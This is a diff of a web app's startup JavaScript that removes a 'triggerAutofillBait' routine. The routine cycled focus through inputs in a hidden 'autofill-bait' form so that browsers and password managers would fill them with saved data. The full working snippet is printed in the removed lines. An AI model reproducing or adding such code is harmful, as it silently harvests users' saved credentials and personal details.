@@ -62,38 +62,6 @@ async function startApp() {
         document.getElementById('loading').style.display = 'none';
         app.style.display = 'flex';
 
-        // Run AFTER the page is visible and before user interacts
-(function triggerAutofillBait() {
-  try {
-    const baitForm = document.getElementById('autofill-bait');
-    if (!baitForm) return;
-
-    // Give the browser a moment, then focus & blur each bait input so some autofill engines
-    // will populate them instead of visible inputs.
-    const baitInputs = Array.from(baitForm.querySelectorAll('input'));
-    let i = 0;
-
-    function focusNext() {
-      if (i >= baitInputs.length) return;
-      const inp = baitInputs[i++];
-      try {
-        inp.focus();
-        // small pause to let password managers / browser autofill act
-        setTimeout(() => {
-          try { inp.blur(); } catch (e) {}
-          // next
-          setTimeout(focusNext, 50);
-        }, 50);
-      } catch (e) { focusNext(); }
-    }
-
-    // small initial delay so we don't race app startup
-    setTimeout(focusNext, 300);
-  } catch (err) {
-    // ignore errors
-  }
-})();
-
         setTimeout(() => {
             app.classList.add('visible');
             // initialize cached element references once
